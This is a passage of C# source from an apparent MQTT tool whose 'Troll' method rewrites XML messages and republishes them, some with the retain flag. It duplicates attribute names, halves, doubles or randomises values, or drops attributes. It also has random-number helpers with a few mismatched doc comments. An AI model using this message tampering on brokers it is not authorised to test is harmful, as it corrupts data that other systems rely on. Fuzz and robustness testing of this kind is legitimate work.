						Output.WriteAttributeString(Attribute.Name + Attribute.Name, Attribute.Value);
						break;

					case 3: // Halve Value
						Output.WriteAttributeString(Attribute.Name, Attribute.Value[0..(Attribute.Value.Length / 2)]);
						break;

					case 4: // Double Value
						Output.WriteAttributeString(Attribute.Name, Attribute.Value + Attribute.Value);
						break;

					case 5: // Random Attribute Name
						Output.WriteAttributeString("_" + Hashes.BinaryToString(RandomBytes(16)), Attribute.Value);
						break;

					case 6: // Random Value
						Output.WriteAttributeString(Attribute.Name, Base64Url.Encode(RandomBytes(16)));
						break;

					case 7: // Skip attribute
						continue;
				}
			}

			if (Element.HasChildNodes)
			{
				foreach (XmlNode Child in Element.ChildNodes)
				{
					if (Child is XmlElement E)
						Troll(E, Output);
					else if (Child is XmlText Text)
						Output.WriteValue(Text.InnerText);      // TODO
				}
			}

			Output.WriteEndElement();
		}

		private static object TrollValue(object Value)
		{
			return Value;   // TODO
		}

		private static async Task Publish(MqttClient Mqtt, string Topic, string Data, char Type)
		{
			await Publish(Mqtt, Topic, Encoding.UTF8.GetBytes(Data), true, Type);
		}

		private static async Task Publish(MqttClient Mqtt, string Topic, byte[] Data, bool Retain, char Type)
		{
			string Digest = ComputeHash(Topic, Data);
			recentlySent[Digest] = true;

			Console.Out.Write(Type);
			await Mqtt.PUBLISH(Topic, MqttQualityOfService.AtMostOnce, Retain, Data);
		}

		private static string ComputeHash(string Topic, byte[] Data)
		{
			byte[] Bin = Encoding.UTF8.GetBytes(Topic);
			int c = Bin.Length;
			int d = Data.Length;
			byte[] Data2 = new byte[c + d];

			Array.Copy(Bin, 0, Data2, 0, c);
			Array.Copy(Data, 0, Data2, c, d);

			return Hashes.ComputeSHA256HashString(Data2);
		}

		private static readonly Cache<string, bool> recentlySent = new Cache<string, bool>(int.MaxValue, TimeSpan.FromMinutes(1), TimeSpan.FromMinutes(1));

		#endregion

		#region Randomness

		private static readonly RandomNumberGenerator rnd = RandomNumberGenerator.Create();

		/// <summary>
		/// Generates a random integer in [0,MaxExclusive).
		/// </summary>
		/// <param name="MaxExclusive">Maximum number (not included in the result).</param>
		/// <returns>Random number in [0,MaxExclusive).</returns>
		private static ulong RandomInt()
		{
			byte[] b = new byte[8];
			rnd.GetBytes(b);
			return BitConverter.ToUInt64(b);
		}

		/// <summary>
		/// Generates a random integer in [0,MaxExclusive).
		/// </summary>
		/// <param name="MaxExclusive">Maximum number (not included in the result).</param>
		/// <returns>Random number in [0,MaxExclusive).</returns>
		private static ulong RandomInt(ulong MaxExclusive)
		{
			return RandomInt() % MaxExclusive;
		}

		/// <summary>
		/// Generates a random double number in [0,MaxInclusive].
		/// </summary>
		/// <param name="MaxInclusive">Maximum number, included in the result.</param>
		/// <returns>Random number in [0,MaxInclusive].</returns>
		private static double RandomDouble(double MaxInclusive)
		{
			byte[] b = new byte[8];
			rnd.GetBytes(b);
			ulong l = BitConverter.ToUInt64(b);
			return (((double)l) / ulong.MaxValue) * MaxInclusive;
		}

		/// <summary>
		/// Generates random bytes.
		/// </summary>
		/// <param name="Data">Buffer that will receive the random bytes.</param>
		private static void RandomBytes(byte[] Data)
		{
			rnd.GetBytes(Data);
		}

		/// <summary>
		/// Generates random bytes.
		/// </summary>
		/// <param name="Size">Number of bytes to generate.</param>
		/// <returns>Random bytes.</returns>
		private static byte[] RandomBytes(int Size)
		{
			byte[] Data = new byte[Size];
			rnd.GetBytes(Data);
			return Data;
		}

		#endregion

	}
}
